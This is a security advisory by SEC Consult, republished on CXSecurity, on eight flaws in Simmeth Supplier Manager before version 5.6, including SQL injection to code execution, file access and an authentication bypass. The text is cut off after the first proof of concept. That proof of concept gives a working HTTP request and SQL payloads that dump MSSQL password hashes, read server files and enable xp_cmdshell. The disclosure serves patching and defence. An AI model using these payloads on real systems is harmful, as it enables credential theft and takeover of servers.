---
title: Simmeth System GmbH Supplier Manager LFI / SQL Injection / Bypass
url: https://cxsecurity.com/issue/WLB-2022110024
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-11-16
fetch_date: 2025-10-03T22:50:48.346216
---

# Simmeth System GmbH Supplier Manager LFI / SQL Injection / Bypass

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Simmeth System GmbH Supplier Manager LFI / SQL Injection / Bypass** **2022.11.15**  Credit:  **[Steffen Robertz](https://cxsecurity.com/author/Steffen%2BRobertz/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-44014](https://cxsecurity.com/cveshow/CVE-2022-44014/ "Click to see CVE-2022-44014")** | **[CVE-2022-44017](https://cxsecurity.com/cveshow/CVE-2022-44017/ "Click to see CVE-2022-44017")** | **[CVE-2022-44015](https://cxsecurity.com/cveshow/CVE-2022-44015/ "Click to see CVE-2022-44015")** | **[CVE-2022-44016](https://cxsecurity.com/cveshow/CVE-2022-44016/ "Click to see CVE-2022-44016")** | **[CVE-2022-44012](https://cxsecurity.com/cveshow/CVE-2022-44012/ "Click to see CVE-2022-44012")** | **[CVE-2022-44013](https://cxsecurity.com/cveshow/CVE-2022-44013/ "Click to see CVE-2022-44013")**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")  [CWE-98](https://cxsecurity.com/cwe/CWE-98 "Click to see CWE-98")** | |

SEC Consult Vulnerability Lab Security Advisory < 20221109-0 >
=======================================================================
title: Multiple Critical Vulnerabilities
product: Simmeth System GmbH Supplier manager (Lieferantenmanager)
vulnerable version: < 5.6
fixed version: 5.6
CVE number: CVE-2022-44012, CVE-2022-44013, CVE-2022-44014,
CVE-2022-44015, CVE-2022-44016, CVE-2022-44017
impact: critical
homepage: https://www.simmeth.net
found: 2022-03-01
by: Steffen Robertz (Office Vienna)
SEC Consult Vulnerability Lab
An integrated part of SEC Consult, an Atos company
Europe | Asia | North America
https://www.sec-consult.com
=======================================================================
Vendor description:
-------------------
"We are an innovative B2B software provider for supply chain management,
especially in the areas of supplier management over the entire supplier
lifecycle and quality control, supply chain key figures and reporting.
Our medium-sized family business is a reliable, practice-oriented partner with
an extraordinary wealth of experience: since 2002, our currently more than 70
medium-sized and corporate customers have trusted our solutions and our
pragmatically oriented expertise."
Source: https://www.simmeth.net/en/company/about-us
Business recommendation:
------------------------
The vendor provides a patch which should be installed immediately.
An in-depth security analysis performed by security professionals is
highly advised, to identify and resolve potential further critical security
issues.
Vulnerability overview/description:
-----------------------------------
1) SQL Injection leading to Remote Code Execution (CVE-2022-44015)
An attacker can inject raw SQL queries. By activating MSSQL features, the
attacker is able to execute arbitrary commands on the MSSQL server.
2) Faulty API Design (CVE-2022-44014)
A faulty API design allows an attacker to fetch arbitrary SQL tables per
design. This will leak all user passwords and MSSQL hashes.
3) Local File Access (CVE-2022-44016)
An attacker can download arbitrary files from the web server by abusing an API
call.
4) Leak of Simmeth's SMTP password
A cleartext password for the email account "LM@simmeth.net" is leaked during
the login process.
5) Stored Cross-Site Scripting (CVE-2022-44012)
An attacker can execute JavaScript code in the browser of the victim if a site
is loaded. The victim's encrypted password can be stolen and most likely be
decrypted.
6) Authentication Bypass (CVE-2022-44013)
An attacker can access multiple API calls without authentication. Thus, all
outlined attacks can be executed without knowing any valid credentials.
7) Errors in Session management (CVE-2022-44017)
Due to errors in the session management, an attacker can log back into a
victim's account after the victim logged out. This is due to the credentials not
being cleaned from the local storage after logout.
8) Information Disclosure
Multiple requests were giving verbose error messages. This helps an attacker in
finding and abusing a vulnerability.
Proof of concept:
-----------------
1) SQL Injection leading to Remote Code Execution (CVE-2022-44015)
Following API call can be used to execute arbitrary SQL queries via a subquery
or stacked query in the table name. Because of vulnerability 6, only a valid
username is required to send the request.
---------------------------------
POST /DS/LM\_API/api/SelectionService/GetPaggedTab HTTP/1.1
Content-Length: 1264
[...]
{
"Credential": {
"Mandant": {
"ConfigPath": "C:\\SSG\\50\_Konfigurationen\\LM.xml",
"ConnectionString": {
"Available": false,
"System": "\*\*\*\*"
},
"Encryption": 1,
"IsWithRegistration": true,
"Name": "\*\*\*\*"
},
"Username": "simmeth",
"System": "\*\*\*\*"
},
"ResultTab": {
"AutoLoad": false,
"Createable": true,
"Databases": [
{
"System": "\*\*\*\*",
"Tables": [
{
"Columns": [],
"Name": "(SELECT name, password\_hash FROM master.sys.sql\_logins)sub;--",
"Relations": [],
"Results": [
{
"ColumnName": "\*"
}
]
}
]
}
],
"Name": "Results",
"PageSize": 2000
},
"Ids": {},
"SecondaryIds": {},
"Constraints": [],
"DateConstraints": {},
"LogicOperator": 0,
"PageNumber": 0,
"Sortings": {},
"TableFilters": {},
"GroupByField": null,
"Aggregates": {},
"isExport": false
}
-------------------
The POC above shows an example subquery, which will respond with the resulting
dataset. Stacked queries will be executed, however, the results will not be
contained in the web server's reply. The example query will dump the MSSQL password
hashes.
Further attacks include arbitrary file read with the following query:
(SELECT \* FROM OPENROWSET(BULK N'c:/windows/system32/license.rtf', SINGLE\_CLOB) AS Contents
)sub;--
And code execution via the xp\_cmdshell extended procedure:
(SELECT @@Version AS version )sub; EXEC ('sp\_configure ''show advanced options'', 1;
RECONFIGURE;'); EXEC ('sp\_configure ''xp\_cmdshell'', 1; RECONFIGURE;');EXEC xp\_cmdshell
'nslookup some.domain';--
2) Faulty API Design (CVE-2022-44014)
The API design allows the frontend to supply an arbitrary table name
(called <TABLE NAME HERE> in the POC below) into the fol...